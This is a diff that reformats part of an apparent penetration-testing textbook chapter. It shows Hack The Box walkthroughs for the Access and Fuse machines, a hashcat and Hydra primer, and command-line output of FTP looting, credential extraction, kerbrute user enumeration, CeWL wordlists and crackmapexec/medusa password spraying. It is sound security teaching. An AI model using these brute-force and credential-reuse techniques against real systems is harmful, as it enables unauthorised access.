@@ -786,81 +786,67 @@ The -r flag tells wget to do a recursive fetch which goes into every directory a
 
 Once the command completes, you will have the following on your local disk:
 
-┌─\[rin@parrot\]─\[~/boxes/Access/FTP\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Access/FTP]
 └──╼ $tree access.htb
-
 access.htb
-
 ├── Backups
-
 │ └── backup.mdb
-
 └── Engineer
-
 └── Access Control.zip
-
 2 directories, 2 files
+```
 
 If you try and unzip Access Control.zip, it will give an error saying that it can't unzip because the zip file uses "unsupported compression method 99" which means that it was zipped using 7-Zip. If you try 7z on it, you will be prompted for a password. So leaving that for the moment, you can explore the access database backup using mdbtools which can be installed with:
 
-┌─\[rin@parrot\]─\[~\]
-
+```bash
+┌─[rin@parrot]─[~]
 └──╼ $sudo apt install mdbtools
+```
 
 Create a directory called tables and move backup.mdb into it then run:
 
-for I in $\(mdb-tables backup.mdb\);do mdb-export backup.mdb $i &gt; $i;done
+```bash
+for I in $(mdb-tables backup.mdb);do mdb-export backup.mdb $i > $i;done
+```
 
 This script will get each table name and then export the contents of the table, saving it to a file named using the table name. Most of the tables are empty and you can sort the files by line count using:
 
-wc -l \* \| sort -n
+```bash
+wc -l * | sort -n
+```
 
 On looking at the files with more than 2 lines, you will notice a table called auth\_user:
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Access/tables\]
-
-└──╼ $cat auth\_user
-
-id,username,password,Status,last\_login,RoleID,Remark
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Access/tables]
+└──╼ $cat auth_user
+id,username,password,Status,last_login,RoleID,Remark
 25,"admin","admin",1,"08/23/18 21:11:47",26,
-
 27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
-
-28,"backup\_admin","admin",1,"08/23/18 21:14:02",26,
+28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
+```
 
 The first thing to try is the engineer password on the zip file:
 
-┌─\[rin@parrot\]─\[~/boxes/Access/access.htb/Engineer\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Access/access.htb/Engineer]
 └──╼ $7z x 'Access Control.zip'
-
-7-Zip \[64\] 16.02 : Copyright I 1999-2016 Igor Pavlov : 2016-05-21
-
-p7zip Version 16.02 \(locale=en\_AU.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs IntelI CoreI i9-9980HK CPU @ 2.40GHz \(906ED\),ASM,AES-NI\)
-
+7-Zip [64] 16.02 : Copyright I 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_AU.UTF-8,Utf16=on,HugeFiles=on,64 bits,
+    2 CPUs IntelI CoreI i9-9980HK CPU @ 2.40GHz (906ED),ASM,AES-NI)
 Scanning the drive for archives:
-
-1 file, 10870 bytes \(11 KiB\)
-
+1 file, 10870 bytes (11 KiB)
 Extracting archive: Access Control.zip
-
 --
-
 Path = Access Control.zip
-
 Type = zip
-
 Physical Size = 10870
-
-Enter password \(will not be echoed\):
-
+Enter password (will not be echoed):
 Everything is Ok
-
 Size: 271360
-
 Compressed: 10870
+```
 
 The pst file is a Microsoft Outlook email file that can be read using the program "readpst". Running this on "Access Control.pst" will extract an mbox file. With cat, the contents reveal an email that is in the "Deleted Items" folder. This email is from john@megacorp.com to security@accesscontrolsystems.com saying that:
 
@@ -868,37 +854,26 @@ The password for the “security” account has been changed to 4Cc3ssC0ntr0ller
 
 You can then use the username security and password 4Cc3ssC0ntr0ller to telnet onto the box:
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Access\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Access]
 └──╼ $telnet access.htb
-
 Trying 10.129.45.60...
-
 Connected to access.htb.
-
-Escape character is '^\]'.
-
+Escape character is '^]'.
 Welcome to Microsoft Telnet Service
-
 login: security
-
 password:
-
-\*===============================================================
-
+*===============================================================
 Microsoft Telnet Server.
-
-\*===============================================================
-
-C:\Users\security&gt;whoami
-
+*===============================================================
+C:\Users\security>whoami
 access\security
-
-C:\Users\security&gt;
+C:\Users\security>
+```
 
 It won't be long before you notice that the shell that Telnet provides is limited. The arrow keys don't work and nor does the delete key. Output is not formatted correctly. This is a very good example of where the shell is not a full TTY. You can improve things by running a Nishang PowerShell reverse shell, but I will leave this here for the moment and come back later when I discuss privilege escalation and persistence.
 
-Brute forcing remote service passwords
+## Brute forcing remote service passwords
 
 We have already come across some examples of brute forcing passwords \(and usernames\) but we are going to go into the subject a bit more deeply here and look one tool in particular THC Hydra to brute force a variety of remote services. First, it is worth mentioning some background about passwords. The perceived wisdom about passwords has changed with the main recommendation for passwords being length and not complexity \(NIST SP 800-63B \([https://pages.nist.gov/800-63-3/sp800-63b.html\)\](https://pages.nist.gov/800-63-3/sp800-63b.html%29\)\). The determination was that adding rules about specific characters and complexity only added a burden on users to remember the password and led to behaviors where users used patterns to choose their passwords. The advent of highly efficient offline password hashing and checking computers along with millions of available breached passwords has led to the increased possibility of a password being brute forced.
 
@@ -910,71 +885,54 @@ Of course, not all password hashes are generated in this way and despite the imp
 
 There are two main ways of brute forcing a password: online and offline. We have encountered methods for both already but let's start with offline cracking. Obtaining password hashes is only the beginning of the process of being able to crack them. We first have to identify what type of hash we are dealing with. The password cracking software hashcat has a flag that will show example hashes for all of the different hashing modes. To list all of the modes of hashing that hashcat supports, you can use the --help flag
 
-┌─\[rin@parrot\]─\[~/book\]
-
+```bash
+┌─[rin@parrot]─[~/book]
 └──╼ $hashcat --help
-
-…
-
-* \[ Hash modes \] -
-
-  \# \| Name \| Category
-
-  ======+=====================+======================================
-
-  900 \| MD4 \| Raw Hash
-
-  0 \| MD5 \| Raw Hash
-
-  100 \| SHA1 \| Raw Hash
-
-  1300 \| SHA2-224 \| Raw Hash
-
-  1400 \| SHA2-256 \| Raw Hash
-
-  10800 \| SHA2-384 \| Raw Hash
-
-  1700 \| SHA2-512 \| Raw Hash
-
-  17300 \| SHA3-224 \| Raw Hash
-
-  17400 \| SHA3-256 \| Raw Hash
-
-  17500 \| SHA3-384 \| Raw Hash
-
-  17600 \| SHA3-512 \| Raw Hash
-
-  6000 \| RIPEMD-160 \| Raw Hash
-
-  600 \| BLAKE2b-512 \| Raw Hash
-
-…
+<SNIP>
+[ Hash modes ] -
+# | Name | Category
+======+=====================+======================================
+900 | MD4 | Raw Hash
+0 | MD5 | Raw Hash
+100 | SHA1 | Raw Hash
+1300 | SHA2-224 | Raw Hash
+1400 | SHA2-256 | Raw Hash
+10800 | SHA2-384 | Raw Hash
+1700 | SHA2-512 | Raw Hash
+17300 | SHA3-224 | Raw Hash
+17400 | SHA3-256 | Raw Hash
+17500 | SHA3-384 | Raw Hash
+17600 | SHA3-512 | Raw Hash
+6000 | RIPEMD-160 | Raw Hash
+600 | BLAKE2b-512 | Raw Hash
+<SNIP>
+```
 
 For each of these modes, we can show an example of the hash by using --example-hashes
 
-┌─\[rin@parrot\]─\[~/boxes\]
-
+```bash
+┌─[rin@parrot]─[~/boxes]
 └──╼ $hashcat -m 1800 --example-hashes
-
-hashcat \(v6.1.1\) starting...
-
+hashcat (v6.1.1) starting...
 MODE: 1800
-
-TYPE: sha512crypt $6$, SHA512 \(Unix\)
-
+TYPE: sha512crypt $6$, SHA512 (Unix)
 HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1
-
 PASS: hashcat
+```
 
 Password cracking can operate in a number of different ways. The first and most basic is to simply try every character combination in sequence. At the opposite end of the scale is to use dictionaries of common passwords and/or common character combinations. As variants of these two approaches, we can optimize the dictionaries by applying what we know about the password syntax rules and also information we may have gathered about the target, personal details like hobbies and interests, dates of birth, where they work etc.
 
 In terms of password syntax, we may know what the minimum and maximum numbers of characters are, whether there needs to be a capital letter, special characters and numbers. Armed with this knowledge, we can simply parse dictionaries like rockyou.txt with a tool like grep. For example, if we wanted to get words that are between 8 and 9 characters long, we could use:
 
+```bash
 egrep '^.{8,9}$' passwords.txt
+```
 
 egrep is an alias for grep -E which supports extended regular expressions. Regular expressions are a set of patterns that will match text according to certain rules. In this expression, the ^ matches the start of a string. The . matches any character and the {8,9} will match characters 8 or 9 times. Finally, the $ matches the end of the word. We can make this expression exclude words that have uppercase letters in them:
 
-egrep '^\[^\[:upper:\]\]{6,7}$' passwords.txt
+```bash
+egrep '^[^[:upper:]]{6,7}$' passwords.txt
+```
 
 The expression \[\[:upper:\]\] matches uppercase letters and the ^ within the \[\] means 'not'.
 
@@ -988,25 +946,25 @@ Once you have a wordlist, you can use tools to take the words and create differe
 
 We will go through an example of generating a custom word list in a moment, but first we can turn to tools for testing passwords directly with an application online. This has become much more challenging recently with improvements in applications that will lock users out after a small number of failed login attempts. However, it can still work where these protections have not been applied, websites with poor security practices, services that do not have the means for password protections of this sort and devices like the Internet of Things where again, password protection is not implemented by default.
 
-Online Password Brute Force
+## Online Password Brute Force
 
 We have already seen a number of tools that can be used to test usernames and passwords for specific remote services. The most comprehensive of these is THC Hydra \([https://github.com/vanhauser-thc/thc-hydra\](https://github.com/vanhauser-thc/thc-hydra\)\) which supports more than 50 different protocols. The basic syntax of Hydra is illustrated in the examples printed out with the use of hydra -h
 
+```bash
 hydra -l user -P passlist.txt ftp://192.168.0.1
-
 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
-
-hydra -C defaults.txt -6 pop3s://\[2001:db8::1\]:143/TLS:DIGEST-MD5
-
-hydra -l admin -p password ftp://\[192.168.0.0/24\]/
-
+hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+hydra -l admin -p password ftp://[192.168.0.0/24]/
 hydra -L logins.txt -P pws.txt -M targets.txt ssh
+```
 
 The -l and -p flags expect a username and password respectively. The capital versions -L and -P will accept files of usernames and passwords. The service is of the format:
 
-&lt;protocol&gt;://&lt;IP Address&gt;:&lt;Port&gt;/&lt;Protocol Options&gt;
+```bash
+<protocol>://<IP Address>:<Port>/<Protocol Options>
+```
 
-&lt;protocol&gt; will be the type of service such as http, smb, ftp pop3. The port can be specified in addition to the IP address although the default port will be used if this is omitted. Finally, there is the ability to specify particular authentication variants as part of the protocol specification.
+**&lt;protocol&gt;** will be the type of service such as http, smb, ftp pop3. The port can be specified in addition to the IP address although the default port will be used if this is omitted. Finally, there is the ability to specify particular authentication variants as part of the protocol specification.
 
 Medusa is another tool, like hydra, which will allow the brute forcing of a range of different services but it has been largely unmaintained since 2015.
 
@@ -1014,398 +972,294 @@ Metasploit also has a number of scanners for services such as FTP, SMB and SSH t
 
 As we will see however, all of these tools respond differently to different settings and protocols and so it is possible to get both false positives and negatives. Checking with another tool is always a good idea.
 
-Exercise: Brute forcing usernames and passwords for remote access on Hack The Box machine Fuse
+## Exercise: Brute forcing usernames and passwords for remote access on Hack The Box machine Fuse
 
 In this exercise, we enumerate users and potential passwords from the public website of the machine Fuse. We then use a few tools, including Kerbrute and CrackMapExec. Eventually we get a username and password that allows us to gain remote access to the machine using evil-winrm.
 
 An nmap scan of the box gives us the following ports:
 
-┌─\[rin@parrot\]─\[~/boxes/Fuse\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Fuse]
 └──╼ $nmap -v -sC -sV -T4 --min-rate 1000 -p- fuse.htb -oA nmap/full-tcp
-
-&lt;SNIP&gt;
-
+<SNIP>
 PORT STATE SERVICE VERSION
-
 53/tcp open domain Simple DNS Plus
-
 80/tcp open http Microsoft IIS httpd 10.0
-
-\| http-methods:
-
-\| Supported Methods: OPTIONS TRACE GET HEAD POST
-
-\|\_ Potentially risky methods: TRACE
-
-\|\_http-server-header: Microsoft-IIS/10.0
-
-\|\_http-title: Site doesn't have a title \(text/html\).
-
-88/tcp open kerberos-sec Microsoft Windows Kerberos \(server time: 2020-12-21 03:44:56Z\)
-
+| http-methods:
+| Supported Methods: OPTIONS TRACE GET HEAD POST
+|_ Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 
+    2020-12-21 03:44:56Z)
 135/tcp open msrpc Microsoft Windows RPC
-
 139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-
-389/tcp open ldap Microsoft Windows Active Directory LDAP \(Domain: fabricorp.local, Site: Default-First-Site-Name\)
-
-445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds \(workgroup: FABRICORP\)
-
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: 
+    fabricorp.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 
+    microsoft-ds (workgroup: FABRICORP)
 464/tcp open kpasswd5?
-
-593/tcp open ncacn\_http Microsoft Windows RPC over HTTP 1.0
-
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
 636/tcp open tcpwrapped
-
-3268/tcp open ldap Microsoft Windows Active Directory LDAP \(Domain: fabricorp.local, Site: Default-First-Site-Name\)
-
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: 
+    fabricorp.local, Site: Default-First-Site-Name)
 3269/tcp open tcpwrapped
-
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 \(SSDP/UPnP\)
-
-\|\_http-server-header: Microsoft-HTTPAPI/2.0
-
-\|\_http-title: Not Found
-
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
 9389/tcp open mc-nmf .NET Message Framing
-
 49666/tcp open msrpc Microsoft Windows RPC
-
 49667/tcp open msrpc Microsoft Windows RPC
-
-49675/tcp open ncacn\_http Microsoft Windows RPC over HTTP 1.0
-
+49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
 49676/tcp open msrpc Microsoft Windows RPC
-
 49679/tcp open msrpc Microsoft Windows RPC
-
 49697/tcp open msrpc Microsoft Windows RPC
-
 49755/tcp open msrpc Microsoft Windows RPC
-
 Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows
-
 Host script results:
-
-\|\_clock-skew: mean: 2h55m31s, deviation: 4h37m09s, median: 15m29s
-
-\| smb-os-discovery:
-
-\| OS: Windows Server 2016 Standard 14393 \(Windows Server 2016 Standard 6.3\)
-
-\| Computer name: Fuse
-
-\| NetBIOS computer name: FUSE\x00
-
-\| Domain name: fabricorp.local
-
-\| Forest name: fabricorp.local
-
-\| FQDN: Fuse.fabricorp.local
-
-\|\_ System time: 2020-12-20T19:45:52-08:00
-
-\| smb-security-mode:
-
-\| account\_used: &lt;blank&gt;
-
-\| authentication\_level: user
-
-\| challenge\_response: supported
-
-\|\_ message\_signing: required
-
-\| smb2-security-mode:
-
-\| 2.02:
-
-\|\_ Message signing enabled and required
-
-\| smb2-time:
-
-\| date: 2020-12-21T03:45:51
-
-\|\_ start\_date: 2020-12-21T03:35:26
+|_clock-skew: mean: 2h55m31s, deviation: 4h37m09s, median: 15m29s
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: Fuse
+| NetBIOS computer name: FUSE\x00
+| Domain name: fabricorp.local
+| Forest name: fabricorp.local
+| FQDN: Fuse.fabricorp.local
+|_ System time: 2020-12-20T19:45:52-08:00
+| smb-security-mode:
+| account_used: <blank>
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled and required
+| smb2-time:
+| date: 2020-12-21T03:45:51
+|_ start_date: 2020-12-21T03:35:26
+```
 
 The OS discovery suggests that the box is a Windows Server 2016. The variety of ports like DNS, LDAP and Kerberos suggest that it is an Active Directory domain controller with the domain fabricorp.local. We can add this hostname to the /etc/hosts file. An interesting note at this point is whether add the fabricorp.local DNS to the list of nameservers to query so that any other subdomains would be accessible automatically. You can normally do this by adding the entry nameserver &lt;IP address&gt; to the file /etc/resolv.conf. However, in this case, the DNS returned the incorrect IP address for fabricorp.local and so this is not an option.
 
-Going to the website, we get redirected to the URL [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm) and so we can add fuse.fabricorp.local to the /etc/hosts file as well. This gives us a page shown in Figure 4-8.
+Going to the website, we get redirected to the URL [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm) and so we can add fuse.fabricorp.local to the /etc/hosts file as well. This gives us a page shown here:
 
-!\[Graphical user interface
+![fuse.fabricorp.local home page. A PaperCut printing administration page.](../.gitbook/assets/fuse1.png)
 
-Description automatically generated\]\(../.gitbook/assets/6.png\)
+The page is an instance of the PaperCut printing software printer logs. On the page, we can see print logs for 3 specific days. Going into each entry, we find records of print jobs for a variety of users as in the entry for the 29th May 2020.
 
-fuse.fabricorp.local home page. A PaperCut printing administration page.
-
-The page is an instance of the PaperCut printing software printer logs. On the page, we can see print logs for 3 specific days. Going into each entry, we find records of print jobs for a variety of users as in the entry for the 29th May 2020 shown in Figure 4-9.
-
-![](../.gitbook/assets/7.png)
-
-Print log for 29th May 2020.
+![Print log for 29th May 2020](../.gitbook/assets/7.png)
 
 Enumerating the website it is apparent that the site is static HTML and so even if there was a CVE related to this version of PaperCut, there would be nothing to exploit. Instead, we can focus on the users that are listed with the print jobs:
 
+```bash
 pmerton
-
 tlavel
-
 sthompson
-
 bhult
-
 administrator
+```
 
-We can add these to a file users.txt and use a program kerbrute to check if these users exist on the fabricorp.local domain. To get kerbrute, you can download a release from [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute). Running this with the users listed above, we get:
+We can add these to a file users.txt and use a program kerbrute to check if these users exist on the fabricorp.local domain. 
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]
+{% hint style="info" %}
+To get kerbrute, you can download a release from [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute).
+{% endhint %}
 
+ Running this with the users listed above, we get:
+
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Fuse]
 └──╼ $kerbrute userenum -d fabricorp.local --dc fabricorp.local users.txt
-
-\_\_ \_\_ \_\_
-
-/ /\_\_\_\_\_ \_\_\_\_\_/ /\_ \_\_\_\_\_\_\_ \_\_/ /\_\_\_\_
-
-/ //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
-
-/ ,&lt; / \_\_/ / / /\_/ / / / /\_/ / /\_/ \_\_/
-
-/\_/\|\_\|\_\_\_/\_/ /\_.\_\_\_/\_/ \_\_,\_/\_\_/\_\_\_/
-
-Version: v1.0.3 \(9dad6e1\) - 12/21/20 - Ronnie Flathers @ropnop
-
-2020/12/21 13:58:13 &gt; Using KDC\(s\):
-
-2020/12/21 13:58:13 &gt; fabricorp.local:88
-
-2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: pmerton@fabricorp.local
-
-2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: tlavel@fabricorp.local
-
-2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: sthompson@fabricorp.local
-
-2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: administrator@fabricorp.local
-
-2020/12/21 13:58:14 &gt; \[+\] VALID USERNAME: bhult@fabricorp.local
-
-2020/12/21 13:58:14 &gt; Done! Tested 5 usernames \(5 valid\) in 0.389 seconds
+        __ __ __
+   / /_____ _____/ /_ _______ __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< / __/ / / /_/ / / / /_/ / /_/ __/
+/_/|_|\\_/_/ /_.___/_/ \\,_/\\/\\_/
+Version: v1.0.3 (9dad6e1) - 12/21/20 - Ronnie Flathers @ropnop
+2020/12/21 13:58:13 > Using KDC(s):
+2020/12/21 13:58:13 > fabricorp.local:88
+2020/12/21 13:58:14 > [+] VALID USERNAME: pmerton@fabricorp.local
+2020/12/21 13:58:14 > [+] VALID USERNAME: tlavel@fabricorp.local
+2020/12/21 13:58:14 > [+] VALID USERNAME: sthompson@fabricorp.local
+2020/12/21 13:58:14 > [+] VALID USERNAME: administrator@fabricorp.local
+2020/12/21 13:58:14 > [+] VALID USERNAME: bhult@fabricorp.local
+2020/12/21 13:58:14 > Done! Tested 5 usernames (5 valid) in 0.389 seconds
+```
 
 Now that we have valid usernames, we need password candidates and a place to try them. We are going to use CeWL to parse the website and generate a wordlist.
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Fuse]
+└──╼ $cewl -d 3 -m 8 --with-numbers -w fabricorp_wordlist.txt 
+http://fuse.fabricorp.local/papercut/logs/html/index.htm
 
-└──╼ $cewl -d 3 -m 8 --with-numbers -w fabricorp\_wordlist.txt [http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm)
-
-CeWL 5.4.8 \(Inclusion\) Robin Wood \(robin@digi.ninja\) \([https://digi.ninja/\](https://digi.ninja/\)\)
+CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+```
 
 We have specified a depth of 3 \(-d 3\) for the program to crawl, a minimum password length of 8 \(-m 8\), we want words that contain numbers \(--with-numbers\) and an output file fabricorp\_wordlist.txt and the URL of the home page we want to crawl. This generates a wordlist of the type:
 
-┌─\[rin@parrot\]─\[~/boxes/Fuse\]
-
-└──╼ $cat fabricorp\_wordlist.txt
-
+```bash
+┌─[rin@parrot]─[~/boxes/Fuse]
+└──╼ $cat fabricorp_wordlist.txt
 PaperCut
-
 GRAYSCALE
-
 papercut
-
 sthompson
-
 LONWK019
-
 Document
-
 Grayscale
-
 Software
-
 Copyright
-
 Location
-
 NotepadLETTER
-
 Language
-
 printing
-
 International
-
 bnielson
-
 LONWK015
-
 mountain
-
 Fabricorp01
+```
 
 We can't use Hydra with this machine. It will error out when trying to brute force SMB and if you try SMB v2, after compiling a version with this support, it will not report the specific SMB error we are looking for. To do that, we need to use crackmapexec which illustrates that sometimes using a range of tools is a good option. Using crackmapexec, we get an error for the user tlavel and password Fabricorp01 that the STATUS\_PASSWORD\_MUST\_CHANGE.
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]
-
-└──╼ $crackmapexec smb fuse.htb -u users.txt -p fabricorp\_wordlist.txt
-
-SMB 10.129.2.5 445 FUSE \[\*\] Windows Server 2016 Standard 14393 x64 \(name:FUSE\) \(domain:fabricorp.local\) \(signing:True\) \(SM
-
-Bv1:True\)
-
-SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\pmerton:PaperCut STATUS\_LOGON\_FAILURE
-
-SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\tlavel:LONWK015 STATUS\_LOGON\_FAILURE
-
-SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\tlavel:mountain STATUS\_LOGON\_FAILURE
-
-SMB 10.129.2.5 445 FUSE \[-\] fabricorp.local\tlavel:Fabricorp01 STATUS\_PASSWORD\_MUST\_CHANGE
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Fuse]
+└──╼ $crackmapexec smb fuse.htb -u users.txt -p fabricorp_wordlist.txt
+SMB 10.129.2.5 445 FUSE [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) 
+    (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB 10.129.2.5 445 FUSE [-] fabricorp.local\pmerton:PaperCut STATUS_LOGON_FAILURE
+SMB 10.129.2.5 445 FUSE [-] fabricorp.local\tlavel:LONWK015 STATUS_LOGON_FAILURE
+SMB 10.129.2.5 445 FUSE [-] fabricorp.local\tlavel:mountain STATUS_LOGON_FAILURE
+SMB 10.129.2.5 445 FUSE [-] fabricorp.local\tlavel:Fabricorp01 
+    STATUS_PASSWORD_MUST_CHANGE
+```
 
 An alternative to crackmapexec is medusa which can be used with the the user file \(-U users.txt\), the password file \(-P fabricorp\_wordlist.txt\) and the SMB NT module \(-M smbnt\). This gives the following output:
 
-┌─\[rin@parrot\]─\[~/boxes/Fuse\]
-
-└──╼ $medusa -h fuse.htb -U users.txt -P fabricorp\_wordlist.txt -M smbnt
-
-Medusa v2.2 \[[http://www.foofus.net\](http://www.foofus.net\)\] \(C\) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
-
-ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: PaperCut \(1 of 45 complete\)
-
-ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: GRAYSCALE \(2 of 45 complete\)
-
-ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: papercut \(3 of 45 complete\)
-
-ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: pmerton \(1 of 5, 0 complete\) Password: sthompson \(4 of 45 complete\)
-
-…
-
-ACCOUNT CHECK: \[smbnt\] Host: fuse.htb \(1 of 1, 0 complete\) User: tlavel \(2 of 5, 1 complete\) Password: Fabricorp01 \(18 of 45 complete\)
-
-ACCOUNT FOUND: \[smbnt\] Host: fuse.htb User: tlavel Password: Fabricorp01 \[SUCCESS \(0x000224:STATUS\_PASSWORD\_MUST\_CHANGE\)\]
-
-…
+```bash
+┌─[rin@parrot]─[~/boxes/Fuse]
+└──╼ $medusa -h fuse.htb -U users.txt -P fabricorp_wordlist.txt -M smbnt
+Medusa v2.2 [
+http://www.foofus.net\
+] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+ACCOUNT CHECK: [smbnt] Host: fuse.htb (1 of 1, 0 complete) 
+    User: pmerton (1 of 5, 0 complete) Password: PaperCut (1 of 45 complete)
+ACCOUNT CHECK: [smbnt] Host: fuse.htb (1 of 1, 0 complete) 
+    User: pmerton (1 of 5, 0 complete) Password: GRAYSCALE (2 of 45 complete)
+ACCOUNT CHECK: [smbnt] Host: fuse.htb (1 of 1, 0 complete) 
+    User: pmerton (1 of 5, 0 complete) Password: papercut (3 of 45 complete)
+ACCOUNT CHECK: [smbnt] Host: fuse.htb (1 of 1, 0 complete) 
+    User: pmerton (1 of 5, 0 complete) Password: sthompson (4 of 45 complete)
+<SNIP>
+ACCOUNT CHECK: [smbnt] Host: fuse.htb (1 of 1, 0 complete) 
+    User: tlavel (2 of 5, 1 complete) Password: Fabricorp01 (18 of 45 complete)
+ACCOUNT FOUND: [smbnt] Host: fuse.htb 
+    User: tlavel Password: Fabricorp01 
+        [SUCCESS (0x000224:STATUS_PASSWORD_MUST_CHANGE)]
+<SNIP>
+```
 
 Whichever way you do it, the end result is that the password for tlavel, Fabricorp01 needs to be reset. We can do this with smbpasswd:
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Fuse]
 └──╼ $smbpasswd -U tlavel -r fabricorp.local
-
 Old SMB password:
-
 New SMB password:
-
 Retype new SMB password:
-
 Password changed for user tlavel
+```
 
 If we test the new password Fabricorp02 with crackmapexec, we get:
 
-┌─\[rin@parrot\]─\[/opt/impacket\]
-
+```bash
+┌─[rin@parrot]─[/opt/impacket]
 └──╼ $crackmapexec smb fuse.htb -u tlavel -p Fabricorp02
-
-SMB 10.129.70.212 445 FUSE \[\*\] Windows Server 2016 Standard 14393 x64 \(name:FUSE\) \(domain:fabricorp.local\) \(signing:True\) \(SMBv1:True\)
-
-SMB 10.129.70.212 445 FUSE \[+\] fabricorp.local\tlavel:Fabricorp02
+SMB 10.129.70.212 445 FUSE [*] Windows Server 2016 Standard 14393 x64 
+    (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
+SMB 10.129.70.212 445 FUSE [+] fabricorp.local\tlavel:Fabricorp02
+```
 
 The password gets reset every minute on this machine back to Fabricorp01 and so whatever we do to test access, we need to do it straight after resetting the password. There is also a password history kept and so each time the password is changed from Fabricorp01, it needs to be changed to an entirely new password.
 
 We can do that and then log into the machine using rpcclient. Interestingly, rpcclient will also report NT\_STATUS\_PASSWORD\_MUST\_CHANGE if we use the original Fabricorp01
 
-┌─\[rin@parrot\]─\[~/boxes/Fuse\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Fuse]
 └──╼ $rpcclient -U tlavel fuse.htb
-
 Enter WORKGROUP\tlavel's password:
-
-Cannot connect to server. Error was NT\_STATUS\_PASSWORD\_MUST\_CHANGE
+Cannot connect to server. Error was NT_STATUS_PASSWORD_MUST_CHANGE
+```
 
 Using enumdomusers to enumerate the users on the box, we get an extended list of users:
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Fuse\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Fuse]
 └──╼ $rpcclient -U tlavel fuse.htb
-
 Enter WORKGROUP\tlavel's password:
-
-rpcclient $&gt; enumdomusers
-
-user:\[Administrator\] rid:\[0x1f4\]
-
-user:\[Guest\] rid:\[0x1f5\]
-
-user:\[krbtgt\] rid:\[0x1f6\]
-
-user:\[DefaultAccount\] rid:\[0x1f7\]
-
-user:\[svc-print\] rid:\[0x450\]
-
-user:\[bnielson\] rid:\[0x451\]
-
-user:\[sthompson\] rid:\[0x641\]
-
-user:\[tlavel\] rid:\[0x642\]
-
-user:\[pmerton\] rid:\[0x643\]
-
-user:\[svc-scan\] rid:\[0x645\]
-
-user:\[bhult\] rid:\[0x1bbd\]
-
-user:\[dandrews\] rid:\[0x1bbe\]
-
-user:\[mberbatov\] rid:\[0x1db1\]
-
-user:\[astein\] rid:\[0x1db2\]
-
